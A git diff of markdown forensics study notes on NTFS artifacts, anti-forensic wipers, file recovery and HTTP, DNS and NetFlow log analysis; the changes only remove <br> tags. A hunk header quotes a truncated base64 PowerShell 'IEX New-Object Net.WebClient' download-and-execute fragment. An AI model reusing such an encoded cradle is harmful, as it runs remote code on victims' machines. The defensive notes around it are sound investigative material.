 - Timestomping is common with attackers and malware authors to make their files hide in plain sight
@@ -4371,7 +4517,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
   5. $STANDARD_INFORMATION times prior to $I30 slack entries
   6. MFT entry number is significantly out of sequence from expected range
 
-<br>
+
 
 ### Timestomp Detection
 - MTFECmd
@@ -4388,7 +4534,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 - AppCompatCacheParser.exe
   - (3) Compare Last Modificaiton time (more recent) to the file systems last modification time
 
-<br>
+
 
 ### Analyzing $DATA
 - File data is maintained by the $DATA attribute
@@ -4397,7 +4543,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 - Files can have multiple $DATA streams
   - The extra, or "Alternate Data Streams" (ADS), must be named
 
-  <br>
+  
 
 ### Extracting Data with The Sleuth Kit - icat
 ```
@@ -4410,7 +4556,7 @@ icat [options] image inode > extracted.data
   - By default, the icat tool extracts data to STDOUT based on a specific metadata entry
   - Able to extract data from metadata entries marked deleted
 
-<br>
+
 
 - Extracting NTFS $DATA streams
   - With NTFS, the default will be to extract out the primary $DATA stream
@@ -4428,7 +4574,7 @@ ReferrerURL=https://www.example.com
 HostUrl=https://www.badwebsite.com/most/likely/malware/412341234?journalCode=acmm
 ```
 
-<br>
+
 
 ### The Zone Identifier ADS -  Evidence of Download
 
@@ -4467,7 +4613,7 @@ MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
  - Filter .exe
  - Note "Zone Id Contents" Column
 
-<br>
+
 
 ### Filenames
 - Filenames potentially sotred in two places:
@@ -4476,14 +4622,14 @@ MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
   - Directory Data
     - Contains list of children files/directories
 
-<br>
+
 
 **Lethal Technique**
 - Most file wipping software does not wipe directory entries
 - Slack space of directory will contain metadata including file names and timestamps
 - Some forensic tools ignore directory slack entries
 
-<br>
+
 
 ### NTFS Directory Attributes
 - Stored in an index named $I30
@@ -4493,7 +4639,7 @@ MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
   - $INDEX_ALLOCATION -- required for larger directories (stored in clusters)
     - Always non-resident
 
-<br>
+
 
 ### Parsing I30 Directory Indexes
 
@@ -4505,7 +4651,7 @@ MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
 Indx2Csv /IndxFile:G:\cases\$I30 /OutputPath:G:\cases
 ```  
 
-<br>
+
 
 **Velociraptor**
 - Parses out active and slack entries
@@ -4515,7 +4661,7 @@ Indx2Csv /IndxFile:G:\cases\$I30 /OutputPath:G:\cases
 Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windows\\Temp\\Perfmon\\" --format=csv
 ```
 
-<br>
+
 
 ### File System Jounraling Overview
 - Records files system metadata changes
@@ -4526,7 +4672,7 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
   - Like VSS, they serve as a time machine, detailing past file system activites
   - Unlike VSSm the journals are rolling logs, rather than a point in time snapshot
 
-<br>
+
 
 ### $LogFile Provides File System Resilience
 - $LogFile stores low-level transactional logs for NTFS consistency
@@ -4534,7 +4680,7 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
 - Tends to last just a dew hours on active systems
   - Secondary drives often last much longer (i.e. days)
 
-<br>
+
 
 ### UsnJrnl
 - Stores high-level summary information about changes to files & directories
@@ -4543,28 +4689,28 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
 	- Secondary drives often last much longer (i.e., weeks)
 - Stored in large $J ADS
 
-<br>
+
 
 ### Common Activity Patterns in the Journals
 - Due to the somwhat cryptic nature of the journals (particularly the $LogFile), interpretation often requires understanding activity patterns
 - Below are several common activities on the file system and a reliable set of codes from the journals to signify their occurence (look for the combination of the codes to avoid false-positives)
 
-<br>
+
 
 | **Action** | **$LogFile Codes** | **$UsnJrnl Codes** |
 | :---------------: | :---------------: | :---------------: |
-|File/Directory Creation|AddIndexEntryAllocation <br> InitializeFileRecordSegment|FileCreate|
-|File/Directory Deletion|DeleteIndexEntryAllocation <br> DeallocationFileRecordSegment|FileDelete|
-|File/Directory Rename or Move|DeleteIndexEntryAllocation <br> AddIndexEntryAllocation|RenameOldName <br> RenameNewName|
-|ADS Creation|CreateAttribute with name ending in ":ADS"|StreamChange <br> NamedDataExtend|
+|File/Directory Creation|AddIndexEntryAllocation  InitializeFileRecordSegment|FileCreate|
+|File/Directory Deletion|DeleteIndexEntryAllocation  DeallocationFileRecordSegment|FileDelete|
+|File/Directory Rename or Move|DeleteIndexEntryAllocation  AddIndexEntryAllocation|RenameOldName  RenameNewName|
+|ADS Creation|CreateAttribute with name ending in ":ADS"|StreamChange  NamedDataExtend|
 |File Data Modification|* Op codes for $LogFile are not sufficient to determine file modification|DataOverwrite - DataExtend - Data Truncation|
 
-<br>
+
 
 ### Useful Filter and Searches in the Journals
 - Parent directory filtering is a powerful technique with journal logs
 
-<br>
+
 
 | **Parent Directories to Filter** | **Investigative Relevance** |
 | :---------------: | :---------------: |
@@ -4576,7 +4722,7 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
 |C:\Users&#92;*\AppData\Roaming\Microsoft\Windows\Recent|Find additional times and files opened by users|
 |C:&#92;$Recycle.Bin&#92;SID|Check for deleted files prior to Recycle Bin empty|
 
-<br>
+
 
 **File Types or Names of Interest Created or Recently Deleted**
 - Executables (.exe, .dll, .sys, .pyd)
@@ -4584,7 +4730,7 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
 - Scripts (.ps1, .vbs, bat)
 - IOC file/directory names
 
-<br>
+
 
 ### LogFileParser for $LogFile Analysis
 
@@ -4599,13 +4745,13 @@ LogFileParser.exe /LogFileFile:E: \C\$LogFile /OutputPath:G: \ntfs-anti-forensic
   - if_CurrentAttribute: Identifies which attributes are being changed
   - if_TextInformation: When applicable, provides pointers to payload data in supporting files
 
-<br>
+
 
 - [LogFileParser](https://github.com/jschicht/LogFileParser)
 - [$MFT and $LogFile Analysis](https://tzworks.com/prototype_page.php?proto_id=46)
 - [$MFT and $Logfile Analysis User Guide (mala)](https://tzworks.com/prototypes/mala/mala.users.guide.pdf)
 
-<br>
+
 
 ### MFTECmd for $UsnJrnl Analysis
 
@@ -4621,11 +4767,11 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - Update Sequence Number: Update Seq. Number
   - File Attributes: Attribute Flags
 
-<br>
+
 
 - [Windows Journal Parser (jp) Users Guide](https://tzworks.com/prototypes/jp/jp.users.guide.pdf)
 
-<br>
+
 
 ### NTFS: What Happens When a File is Deleted?
 - Data Layer
@@ -4638,7 +4784,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - $File_Name attribute is preserved until MFT record is reused
   - $I30 index entry in parent directory may be preserved
 
-<br>
+
 
 ## Advanced Evidence Recovery
 
@@ -4648,7 +4794,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - SDelete
   - BCWipe
 
-<br>
+
 
 ### SDelete
 - Indicators (USNJrnl)
@@ -4658,25 +4804,25 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - $I30 Slack has indicators
   - Prefetch has indicators (files touch within 10 seconds of execution)
 
-<br>
+
 
 ### BCWiper
 - Renames files once with random name equal in size to original
 - $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist
 
-<br>
+
 
 
 ### Eraser
 - Includes an option to use a "legitamate" file name prior to final deletion
 - Renamed MFT records (with ADS, if present), $I30 slack, $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist
 
-<br>
+
 
 ### Cipher
 - Creates a persist directory name EFSTMPWP at the volume root and adds temp files within it to fill free space
 
-<br>
+
 
 ### Registry Key/Value "Records" Recovery
 - Registry hives have unallocated space similar to filesystems
@@ -4686,7 +4832,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - Timestamps
 - Eric Zimmerman's Registry Explorer makes recovering deleted registry data trivial
 
-<br>
+
 
 ### Finding Fileless Malware in the Registry
 - Attackers try ot hide amongst the noise in the registry
@@ -4694,7 +4840,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - Detect Large Values
 - Detect Base64 values
 
-<br>
+
 
 ### File Recovery
 
@@ -4702,13 +4848,13 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - When a file is deleted, its metadata is marked as unused, but metadata remains
 - Read metadata entries that are marked as deleted and extract the data from any clusters it points to
 
-<br>
+
 
 **Carving Method**
 - If the metadata entry has been resused, the data may still reside on disk, but we have to search for it
 - Use known file signatures to find the start, then extract the data to a known file footer or to reasonable size limit
 
-<br>
+
 
 **Files to Target**
 - Link Files
@@ -4724,7 +4870,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - Images
 - Videos
 
-<br>
+
 
 ### File Recovery via Metadata Method
 - Extract deleted files individually with icat
@@ -4737,7 +4883,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 
 - Multiple forensic tools can locate MFT entries marked deleted and allow us to export (FTK Imager)
 
-<br>
+
 
 ### File Recovery via Carving Method
 - PhotoRec is an excellent free file carver
@@ -4746,7 +4892,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - Leverages metadata from carved files
 - [PhotoRec](https://www.cgsecurity.org/wiki/PhotoRec)
 
-<br>
+
 
 ### Recovering Deleted Volume Shadow Copy Snapshots
 - The ultimate files to recover -- VSS files
@@ -4755,7 +4901,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - [Deleted Shadow Copies](http://www.kazamiya.net/en/DeletedSC)
 - [Black Hat Presentation](https://i.blackhat.com/us-18/Thu-August-9/us-18-Kobayashi-Reconstruct-The-World-From-Vanished-Shadow-Recovering-Deleted-VSS-Snapshots.pdf)
 
-<br>
+
 
 - Step 1: Use vss_carver against the raw image
 
@@ -4774,7 +4920,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 ```cd /mnt/vsscarve_basefile/```  
 ```for i in vss*; do mountwin $i /mnt/shadowcarve_basefile/$i; done```  
 
-<br>
+
 
 ### Stream Carving for Event Log and File System Records
 - Potential to recover several important record types
@@ -4789,7 +4935,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - [Bulk Extractor](https://github.com/simsong/bulk_extractor/wiki)
 - [Bulk Extractor with Record Carving](https://www.kazamiya.net/en/bulk_extractor-rec)
 
-<br>
+
 
 ### Carving for Strings
 - [bstrings](https://github.com/EricZimmerman/bstrings)
@@ -4798,7 +4944,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 
 - [Autopsy Keyword Search and Indexing](https://www.sleuthkit.org/autopsy/keyword.php)
 
-<br>
+
 
 ## Defensive Coutermeasures
 
@@ -4814,7 +4960,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - Monitor for suspicious file system activity
   - fsutil, vssadmin, wmic, shadowcopym win32_shadowcopy
 
-<br>
+
 
 ### Level Up on Visibility
 - Log
@@ -4823,7 +4969,7 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
   - PowerShell and Windows audit policy improvements
   - EDR technology such as sysmon
 
-<br>
+
 
 # Network Forensics
 
@@ -4840,17 +4986,17 @@ mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
 - Username (If proxy authentication used)
 - MIME Type (Given by the Originating Server)
 
-<br>
+
 
 ### Convert Timestamps
 ```date -d @1573137112.368```
 
-<br>
+
 
 To UTC  
 ```date -u -d @1573137112.368```
 
-<br>
+
 
 Convert a lot of timestamps at once
 ```
@@ -4859,7 +5005,7 @@ awk '{$1=strftime("%F %T", $1, 1);
 print $0}'
 ```
 
-<br>
+
 
 ### Threat Hunt Process
 - Plan
@@ -4869,7 +5015,7 @@ print $0}'
 - Support/refute/refine hypothesis
   - Repeat until stable
 
-<br>
+
 
 ### Uniq Domain Counts
 ```
@@ -4879,7 +5025,7 @@ awk -f/ '{ print $3 }' |
 sort | uniq -c | sort -nr
 ```
 
-<br>
+
 
 ### Google Auto Complete
 ```
@@ -4890,7 +5036,7 @@ grep google.com access.log | grep complete | wc -l
 grep google.com access.log | grep complete | less
 ```
 
-<br>
+
 
 ## HTTPS
 
@@ -4903,13 +5049,13 @@ grep google.com access.log | grep complete | less
 - TRACE: Used in troubleshooting a request across multiple proxy srevers -- this is not common and is generally disabled on servers
 - CONNECT: Requests that a proxy switch to a tunnel, such as with SSL/TLS encryption
 
-<br>
+
 
 Notes:
 - Other specialized protocols such as WebDAV user their own methods as well
 - X-Forwarded-For: a header that indicates the original source of the rquest in the event that multiple proxy servers handled the request
 
-<br>
+
 
 ### Response Codes
 - **100, Continue**: After the serer recieves the headers for a request, this directs the client to proceed
@@ -4926,13 +5072,13 @@ Notes:
 - **503, Service Unavailable**:, Server is overloaded or undergoing maintenance.
 - **507, Network Authentication Required**: Client must authenticate to gain access-used by captive proxies such as at Wi-Fi hotspots.
 
-<br>
+
 
 Notes
 - A long bout of 400-series return codes from a single IP address may suggest recon
 - A sequence of 500-series return codes against a search form followed by a 200 response and a lot of HTTP POST requests could be SQL injection attempt and success, followed by post-compromise operations
 
-<br>
+
 
 ### Response Components
 - Server contiues using current TCP session
@@ -4948,7 +5094,7 @@ Notes
   - ```Content-Type: text/html; charset=utf-8```
   - ```Content-Encoding: gzip```
 
-<br>
+
 
 ### Useful Fields
 - Data Extracted from Compromised Systems (POST)
@@ -4959,14 +5105,14 @@ Notes
 - URIs show a subjects activity
   - Requested URL, Referer, Location (Redirect)
 
-<br>
+
 
 **Google Analytics Cookies**
 - track visitors source, path, and history
 - Include very useful timestamps and counters
 - Long-living: 2yr, 30 min, 6 mo rolling retention periods
 
-<br>
+
 
 ### HTTP2
 - Sent via TLS
@@ -4977,7 +5123,7 @@ Notes
 - Servers can force "push" objects to browsers
   - No browser indication that object was not requested
 
-<br>
+
 
 **SIFT - Proxy Logs**  
 - Display the time, request method, hostname, requested URI, and User-Agent string from the contents of a pcap file  
@@ -5001,7 +5147,7 @@ Notes
 - Determine time between key presses within each search
  - ```tshark -n -C no_desegment_tcp -r 10_3_59_127.pcap -T fields -e frame.time_delta_displayed -e frame.time -e http.request.uri -Y 'http.user_agent contains "MSIE 8.0" and http.request.uri contains "sugexp"'```
 
- <br>
+ 
 
 ### HTTP Log Formats
 - Apache
@@ -5014,7 +5160,7 @@ Notes
   - Central Binary Logging, ODBC database
   - Customizable with field names
 
-<br>
+
 
 ### NCSA Common Format
 - Requesting Hostname/IP
@@ -5025,7 +5171,7 @@ Notes
 - Status code of last request (incl. redirects)
 - Size of requested object (excl. headers)
 
-<br>
+
 
 ### W3C Extended/Combined Format
 - Same NCSA Common Fields
@@ -5034,7 +5180,7 @@ Notes
 - HTTP User-Agent header string
   - May identify malicious utilities or forged traffic
 
-<br>
+
 
 ### IIS Log File Format
 - Requesting IP
@@ -5050,7 +5196,7 @@ Notes
 - Requested resource
 - HTTP GET request parameters
 
-<br>
+
 
 ### IIS Centralized Binary Logging ODBC
 - Highly efficient formats for large/busy servers
@@ -5058,14 +5204,14 @@ Notes
 - Require querying and parsing to get human readable data
 - Microsoft Log Parser is excellent tool for this
 
-<br>
+
 
 ### HTTP Log File Analysis Methods
 - Microsoft Log Parser provides SQL-like powering text and binary files of all kinds
 - SOF-ELK natively handles NCSA and W3C HTTP formats
 - Database backend natively handles SQL Ginsu
 
-<br>
+
 
 ### Investigative Value of HTTP Logs
 - Identify probing for vulnerable websites
@@ -5075,7 +5221,7 @@ Notes
 - Track attackers actions using RAT
   - Reconstruct uploaded malware
 
-<br>
+
 
 ## DNS
 
@@ -5085,7 +5231,7 @@ Notes
 - NXDOMAIN indicates nonexistent domain or hostname
 - Stateless: uses transaction ID field
 
-<br>
+
 
 ### DNS in Network Forensics and Incident Response
 - Should not be fully outsourced to 8.8.8.8
@@ -5093,13 +5239,13 @@ Notes
   - Internal resolvers forward requests outside
   - Block clients from direct external DNS access
 
-<br>
+
 
 ### Fast Flux DNS Single
 - Rapidly changing IP addresses to thwart blocking
   - Typically, low TTLs; many A records per response
 
-<br>
+
 
 ### Fast Flux Double
 - Similar to "single"
@@ -5107,33 +5253,33 @@ Notes
 - First tier of compromised hosts act as DNS proxies
 - Still contain low TTL, A records
 
-<br>
+
 
 ### Detecting Fast Flux DNS
 - DNS Response TTL less than 300
 - DNS Answers greater than 12
 - Recently Registered Domains
 
-<br>
+
 
 ## Domain Generation Algorithms
 - Uses seed value (usually date) for algorithm to create many possible C2 domains
 - Identify via heuristics, historical norms, threat intel
   - Large amount of NXDOMAIN responses
 
-<br>
+
 
 ### DNS over Everything
 - DNS over TLS (Dot), DNS over HTTPs (DOH)
 - DoH
   - HTTPs traffic to name servers
 
-<br>
+
 
 ### Punycode
 - A puny-encoded hostname starts with "xn--" followed by asci chararcters in the hostnname, then another "-"
 
-<br>
+
 
 ## Network Security Monitoring
 - Zeek
@@ -5141,7 +5287,7 @@ Notes
     - Hashes source+dest IP addresses+ports, Layer 4 protocol
     - SHA1 hash of non-directional flow event
 
-<br>
+
 
 ### SIFT - DNS Logs
 - Determine how large the dataset is
@@ -5152,7 +5298,7 @@ Notes
 - Examine the first record from any of the DNS log
   - ```zcat 2019-12-09/dns.21\:00\:00-22\:00\:00.log.gz | head -n 1 | jq '.'```
 
-<br>
+
 
 ### Baseline DNS Data
 - Distrobution of Response Codes
@@ -5173,7 +5319,7 @@ Notes
 - Top 20 queried hostnames that did not return successfully
   - ```zcat 2019-12-*/dns.*.gz | jq -r 'select(.rcode_name != "NOERROR") | .query' | sort | uniq -c | sort -nr | head -n 20```
 
-<br>
+
 
 Notes:
 - High Number of NXDOMAIN
@@ -5182,7 +5328,7 @@ Notes:
   - Identify hostnames that became popular for a short period of time
 - SERVFAIL responses could be of interest
 
-<br>
+
 
 ### Identify Malicious/Suspicious NXDOMAIN Activty using DNS Logs
 - Examine the full set of DNS queries that resulted in an NXDOMAIN response
@@ -5191,7 +5337,7 @@ Notes:
   - ```zcat 2019-12-*/dns.*.gz | jq -r 'select(.query == "dinnernotice.net") | ."id.orig_h"' | sort | uniq -c | sort -nr```
 - Calculate time in between events
 
-<br>
+
 
 ### Identify Malicious/Suspicious DNS Activity Using Threat Intelligence
 - Hostnames associated with IP address
@@ -5202,7 +5348,7 @@ Notes:
   - ```zgrep -h api.roherewharewha.com 2019-12-*/dns.*.gz | jq -cr 'select(."id.orig_h" == "172.16.4.4") | .ts |= todate | { ts, "id.orig_h" }' | head -n 1```
   - ```zgrep -h api.roherewharewha.com 2019-12-*/dns.*.gz | jq -cr 'select(."id.orig_h" == "172.16.4.4") | .ts |= todate | { ts, "id.orig_h" }' | tail -n 1```
 
-<br>
+
 
 ## Netflow
 
@@ -5237,14 +5383,14 @@ Notes:
   - Connection Duration: Long
   - Potential Activity: Tunnel? Suspicious
 
-<br>
+
 
 ### Open Source Tools
  - nfcapd
   - Recieve netflow data (v5, v7, v9, IPFIX, SFLOW)
   - parsed with nfdump
 
-<br>
+
 
 ## FTP
 
@@ -5253,7 +5399,7 @@ Notes:
 - src portrange 1024-65535 or src port 20
 - dst portrange 1024-65535 or dst port 20
 
-<br>
+
 
 ### Tracking Lateral Movement with NetFlow
 - Identify the top five external source IP addresses overall and the top five internal source IP addresses from Client Subnets
@@ -5267,7 +5413,7 @@ Notes:
   - Proxy Log Files
   - DNS Evidence
 
-<br>
+
 
 ### Tracking Lateral Movement with Netflow - Kibana
 - Top 5 External Source IP Addresses
@@ -5292,12 +5438,12 @@ Notes:
   - Traffic spikes, troughs, or plateaus
     - Time Series Graph
 
-<br>
+
 
 ## Microsoft Protocols
 - SMB is also used for Group Policy distrobution & DCE/RPC
 
-<br>
+
 
 ### Windows Architecture
 - Primary Communication/Protocols
@@ -5307,7 +5453,7 @@ Notes:
   - External Clients (VPN)
   - Sharepoint (HTTP or HTTPS)
 
-<br>
+
 
 ### SMB Analysis Goals
 - Attacker Actions
@@ -5315,7 +5461,7 @@ Notes:
   - What have they looked at?
 - Detect patterns of activity or targeting
 
-<br>
+
 
 ### Filter and Review SMB
 - Apply Display Filter
